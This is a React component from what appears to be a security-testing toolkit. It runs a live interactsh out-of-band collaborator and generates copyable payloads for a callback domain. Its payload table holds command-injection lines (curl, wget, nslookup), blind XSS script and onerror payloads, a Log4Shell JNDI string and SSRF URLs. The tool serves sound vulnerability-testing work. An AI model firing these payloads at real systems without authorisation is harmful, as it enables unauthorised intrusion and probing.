// @author: Albert C | @yz9yt | github.com/yz9yt
// components/OobInteractionHelper.tsx
// version 0.2 Beta — live OOB Collaborator (on-demand interactsh server)
import React, { useState, useEffect, useRef, useCallback } from 'react';
import { SignalIcon, ClipboardDocumentListIcon, PuzzlePieceIcon } from './Icons.tsx';
import { ToolLayout } from './ToolLayout.tsx';
import {
    oobStart,
    oobGetInteractions,
    oobStop,
    type OobSessionResponse,
    type OobInteractionItem,
} from '../lib/cliApi.ts';

interface Payload {
    name: string;
    value: string;
}

interface PayloadCategory {
    title: string;
    payloads: (domain: string) => Payload[];
}

const payloadCategories: PayloadCategory[] = [
    {
        title: "DNS (General Purpose)",
        payloads: (domain) => [
            { name: "Plain Domain", value: domain },
            { name: "With Subdomain", value: `sub.${domain}` },
        ]
    },
    {
        title: "Command Injection",
        payloads: (domain) => [
            { name: "nslookup", value: `nslookup ${domain}` },
            { name: "dig", value: `dig ${domain}` },
            { name: "ping", value: `ping -c 1 ${domain}` },
            { name: "cURL", value: `curl http://${domain}` },
            { name: "wget", value: `wget http://${domain}` },
        ]
    },
    {
        title: "Blind XSS",
        payloads: (domain) => [
            { name: "Script Src", value: `<script src=//${domain}></script>` },
            { name: "Image Src", value: `<img src=x onerror="document.location='//${domain}'">` },
            { name: "Import", value: `@import '//${domain}';` },
        ]
    },
    {
        title: "Log4Shell (JNDI)",
        payloads: (domain) => [
            { name: "Basic LDAP", value: `\${jndi:ldap://${domain}/a}` },
        ]
    },
    {
        title: "Blind SSRF",
        payloads: (domain) => [
            { name: "HTTP", value: `http://${domain}` },
            { name: "HTTPS", value: `https://${domain}` },
        ]
    },
];

interface GeneratedPayloads {
    title: string;
    payloads: Payload[];
}

const protocolBadge = (proto: string): string => {
    const p = proto.toLowerCase();
    if (p === 'dns') return 'bg-blue-500/15 text-blue-300 border-blue-500/30';
    if (p === 'http' || p === 'https') return 'bg-green-500/15 text-green-300 border-green-500/30';
    if (p === 'smtp') return 'bg-amber-500/15 text-amber-300 border-amber-500/30';
    return 'bg-white/10 text-white/70 border-white/20';
};

export const OobInteractionHelper: React.FC = () => {
    const [domain, setDomain] = useState<string>('');
    const [copiedPayload, setCopiedPayload] = useState<string | null>(null);
    const [generatedPayloads, setGeneratedPayloads] = useState<GeneratedPayloads[] | null>(null);

    // Live collaborator session state
    const [session, setSession] = useState<OobSessionResponse | null>(null);
    const [interactions, setInteractions] = useState<OobInteractionItem[]>([]);
    const [starting, setStarting] = useState(false);
    const [error, setError] = useState<string | null>(null);
    const pollRef = useRef<number | null>(null);

    const stopPolling = () => {
        if (pollRef.current !== null) {
            window.clearInterval(pollRef.current);
            pollRef.current = null;
        }
    };

    // Clear the polling interval if the component unmounts (the backend reaps the
    // session via idle-timeout). We do not force-stop so brief navigation keeps it.
    useEffect(() => () => stopPolling(), []);

    const startServer = useCallback(async () => {
        setStarting(true);
        setError(null);
        try {
            const s = await oobStart();
            setSession(s);
            setDomain(s.domain);
            setInteractions([]);
            stopPolling();
            pollRef.current = window.setInterval(async () => {
                try {
                    const res = await oobGetInteractions(s.session_id);
                    setInteractions(res.interactions);
                } catch {
                    /* transient poll error — keep trying */
                }
            }, 4000);
        } catch (e: any) {
            setError(e?.message || 'Failed to start OOB server (is interactsh reachable?)');
        } finally {
            setStarting(false);
        }
    }, []);

    const stopServer = useCallback(async () => {
        stopPolling();
        if (session) {
            try { await oobStop(session.session_id); } catch { /* ignore */ }
        }
        setSession(null);
    }, [session]);

    const handleCopy = (payloadValue: string) => {
        navigator.clipboard.writeText(payloadValue);
        setCopiedPayload(payloadValue);
        setTimeout(() => setCopiedPayload(null), 2000);
    };

    const handleGenerate = () => {
        const payloads = payloadCategories.map(category => ({
            title: category.title,
            payloads: category.payloads(domain)
        }));
        setGeneratedPayloads(payloads);
    };

    return (
        <ToolLayout
            icon={<SignalIcon className="h-8 w-8 text-coral" />}
            title="OOB Interaction Helper"
            description={<>Start a live Out-of-Band collaborator server to confirm blind vulns (SSRF, XXE, RCE, blind XSS), or paste your own callback domain from <a href="https://interact.sh" target="_blank" rel="noopener noreferrer" className="text-purple-400 hover:underline">interact.sh</a> / Burp Collaborator.</>}
        >
            {/* Live Collaborator */}
            <div className="max-w-3xl mx-auto card-premium p-5 !bg-ui-bg/40 mb-8">
                <div className="flex items-center justify-between gap-4 flex-wrap">
                    <div className="flex items-center gap-3">
                        <span className={`h-2.5 w-2.5 rounded-full ${session ? 'bg-green-400 animate-pulse' : 'bg-white/30'}`} />
                        <span className="label-mini">{session ? 'Collaborator running' : 'Collaborator stopped'}</span>
                    </div>
                    {!session ? (
                        <button
                            onClick={startServer}
                            disabled={starting}
                            className="btn-mini btn-mini-primary !h-10 !px-6 gap-2"
                            title="Start a live OOB server and get a callback domain"
                        >
                            <SignalIcon className="h-4 w-4" />
                            {starting ? 'STARTING…' : 'START OOB SERVER'}
                        </button>
                    ) : (
                        <button onClick={stopServer} className="btn-mini !h-10 !px-6 gap-2" title="Stop the OOB server">
                            STOP
                        </button>
                    )}
                </div>

                {error && <p className="text-xs text-red-400 mt-3">{error}</p>}

                {session && (
                    <div className="mt-4">
                        <label className="label-mini mb-2 block">Callback domain (click to copy)</label>
                        <div className="bg-black/40 p-3 rounded-xl font-mono text-sm text-ui-accent/90 relative group border border-white/5 cursor-pointer"
                             onClick={() => handleCopy(session.domain)}>
                            <code className="break-all">{session.domain}</code>
                            <span className="absolute top-2 right-2 text-[8px] font-black px-1 text-ui-accent/70">
                                {copiedPayload === session.domain ? 'COPIED' : 'COPY'}
                            </span>
                        </div>

                        <div className="flex items-center justify-between mt-5 mb-2">
                            <span className="label-mini">Interactions ({interactions.length})</span>
                            <span className="text-[10px] text-white/40">polling every 4s · server {session.server}</span>
                        </div>
                        {interactions.length === 0 ? (
                            <p className="text-xs text-white/40 py-4 text-center border border-white/5 rounded-xl">
                                No interactions yet. Embed the domain in a payload and trigger it.
                            </p>
                        ) : (
                            <div className="space-y-2 max-h-64 overflow-y-auto no-scrollbar">
                                {interactions.slice().reverse().map((it, i) => (
                                    <div key={i} className="flex items-center gap-3 bg-black/30 border border-white/5 rounded-lg p-2.5 text-xs">
                                        <span className={`px-2 py-0.5 rounded border font-bold uppercase ${protocolBadge(it.protocol)}`}>{it.protocol}</span>
                                        <span className="font-mono text-white/70">{it.remote_address}</span>
                                        <span className="text-white/30 ml-auto">{it.timestamp?.replace('T', ' ').slice(0, 19)}</span>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                )}
            </div>

            {/* Manual domain + payload generator */}
            <div className="max-w-xl mx-auto">
                <label htmlFor="oob-domain" className="label-mini mb-2 block">Callback Domain</label>
                <input
                    id="oob-domain"
                    type="text"
                    value={domain}
                    onChange={(e) => setDomain(e.target.value)}
                    placeholder="e.g., your-id.oastify.com (or start the collaborator above)"
                    className="input-premium w-full p-4 font-mono text-sm"
                />
            </div>

            <div className="mt-8 flex justify-center">
                <button
                    onClick={handleGenerate}
                    disabled={!domain.trim()}
                    className="btn-mini btn-mini-primary !h-12 !px-10 !rounded-xl shadow-glow-coral group gap-3"
                    title="Generate OOB payloads based on the domain"
                >
                    <PuzzlePieceIcon className="h-5 w-5 group-hover:rotate-12 transition-transform" />
                    GENERATE OOB INTELLIGENCE
                </button>
            </div>

            {generatedPayloads && (
                <div className="mt-10 space-y-8 animate-fade-in">
                    {generatedPayloads.map((category) => (
                        <div key={category.title}>
                            <h4 className="title-standard !text-lg mb-4 pl-1">{category.title}</h4>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                {category.payloads.map((payload) => (
                                    <div key={payload.name} className="card-premium p-4 !bg-ui-bg/40 hover:border-ui-accent/40 transition-all group/card">
                                        <p className="label-mini mb-3 opacity-70">{payload.name}</p>
                                        <div className="bg-black/40 p-3 rounded-xl font-mono text-xs text-ui-accent/90 relative group border border-white/5">
                                            <pre className="overflow-x-auto no-scrollbar"><code className="whitespace-pre-wrap break-all">{payload.value}</code></pre>
                                            <button
                                                onClick={() => handleCopy(payload.value)}
                                                className="absolute top-2 right-2 p-1.5 rounded-lg bg-ui-accent/10 border border-ui-accent/30 text-ui-accent opacity-0 group-hover:opacity-100 focus:opacity-100 transition-all hover:bg-ui-accent/20"
                                                aria-label={`Copy ${payload.name}`}
                                                title={`Copy ${payload.name}`}
                                            >
                                                {copiedPayload === payload.value ? (
                                                    <span className="text-[8px] font-black px-1">COPIED</span>
                                                ) : (
                                                    <ClipboardDocumentListIcon className="h-4 w-4" />
                                                )}
                                            </button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    ))}
                </div>
            )}
        </ToolLayout>
    );
};
